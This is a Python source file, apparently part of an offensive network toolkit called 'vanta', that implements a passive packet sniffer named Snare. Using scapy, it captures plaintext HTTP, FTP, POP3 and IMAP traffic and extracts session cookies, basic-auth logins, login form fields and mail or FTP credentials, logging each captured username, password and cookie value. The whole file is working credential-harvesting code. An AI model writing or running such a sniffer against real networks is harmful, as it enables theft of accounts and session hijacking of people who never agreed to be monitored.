# ============================================================
#  File: vanta/sniff/snare.py
# ============================================================
import threading
from collections import deque
from typing import List, Dict

from scapy.all import TCP, IP, Raw, sniff  # type: ignore

from ..core.logger import Logger
from ..core.config import Config
from .parsers import (
    parse_http_request, parse_ftp, parse_pop3, parse_imap,
)


class Snare:
    """
    Passive sniffer that extracts credentials + cookies from plaintext
    traffic. Does NOT block — pure observation.
    """

    def __init__(self, cfg: Config, logger: Logger, capture_filter: str = ""):
        self.cfg = cfg
        self.log = logger
        self.filter = capture_filter or (
            "tcp port 80 or tcp port 8080 or tcp port 3128 "
            "or tcp port 21 or tcp port 110 or tcp port 143"
        )
        self.credentials: List[Dict] = []
        self.cookies: List[Dict] = []
        self.requests: deque = deque(maxlen=1000)
        self._thread = None
        self._stop = threading.Event()
        self._conn_buf: Dict[str, bytes] = {}
        self.stats = {"packets": 0, "creds": 0, "cookies": 0}

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        if not self.cfg.iface:
            raise RuntimeError("no iface")
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name="vanta-snare")
        self._thread.start()
        self.log.attack("▶ snare started (passive)")

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1.0)
        self.log.attack("■ snare stopped")

    def is_running(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    def clear(self):
        self.credentials.clear()
        self.cookies.clear()
        self.requests.clear()
        self._conn_buf.clear()
        self.stats = {"packets": 0, "creds": 0, "cookies": 0}

    # -------- internals --------------------------------------------
    def _loop(self):
        try:
            sniff(
                iface=self.cfg.iface,
                filter=self.filter,
                prn=self._handle,
                store=False,
                stop_filter=lambda p: self._stop.is_set(),
            )
        except Exception as e:
            self.log.err(f"snare sniff error: {e}")

    def _handle(self, pkt):
        try:
            if not pkt.haslayer(Raw):
                return
            if not pkt.haslayer(TCP):
                return
            payload = bytes(pkt[Raw].load)
            if not payload:
                return

            self.stats["packets"] += 1
            src = pkt[IP].src
            dst = pkt[IP].dst
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            key = f"{src}:{sport}-{dst}:{dport}"

            buf = (self._conn_buf.get(key, b"") + payload)[-8192:]
            self._conn_buf[key] = buf
            if len(self._conn_buf) > 500:
                # cap memory
                for k in list(self._conn_buf)[:100]:
                    self._conn_buf.pop(k, None)

            # ---- HTTP ----
            info = parse_http_request(buf)
            if info:
                info["src"] = src
                info["dst"] = dst
                info["dport"] = dport
                self.requests.append(info)
                if info["cookies"]:
                    for cname, cval in info["cookies"].items():
                        rec = {"host": info["host"], "name": cname,
                               "value": cval, "src": src}
                        self.cookies.append(rec)
                        self.stats["cookies"] += 1
                        self.log.snare(
                            f"COOKIE  {src} → {info['host']}  "
                            f"{cname}={cval[:40]}")

                if info["basic_auth"]:
                    self.log.snare(
                        f"BASIC-AUTH  {src} → {info['host']}  "
                        f"{info['basic_auth']['username']}:"
                        f"{info['basic_auth']['password']}")
                    rec = {"type": "http-basic", "src": src,
                           "host": info["host"], **info["basic_auth"]}
                    self._add_cred(rec)

                for fk, fv in info["form"].items():
                    if any(t in fk.lower() for t in
                           ("user", "pass", "email", "login")):
                        rec = {"type": "http-form", "src": src,
                               "host": info["host"], "field": fk,
                               "value": fv}
                        if fk.lower() in ("user", "email", "login",
                                          "username", "uname"):
                            self._add_cred(rec, kind="username")
                        else:
                            self._add_cred(rec, kind="password")

            # ---- FTP / POP3 / IMAP ----
            for parser, name in ((parse_ftp, "ftp"),
                                 (parse_pop3, "pop3"),
                                 (parse_imap, "imap")):
                rec = parser(buf)
                if rec:
                    rec["src"] = src
                    rec["dst"] = dst
                    self._add_cred(rec)
        except Exception:
            pass

    def _add_cred(self, rec: Dict, kind: str = "credential"):
        # de-dupe on (username, password) if present
        u = rec.get("username") or rec.get("value")
        p = rec.get("password")
        for existing in self.credentials:
            if (existing.get("username") == u and
                existing.get("password") == p and
                existing.get("type") == rec.get("type")):
                return
        self.credentials.append(rec)
        self.stats["creds"] = len(self.credentials)
        self.log.snare(f"CRED    {rec}")
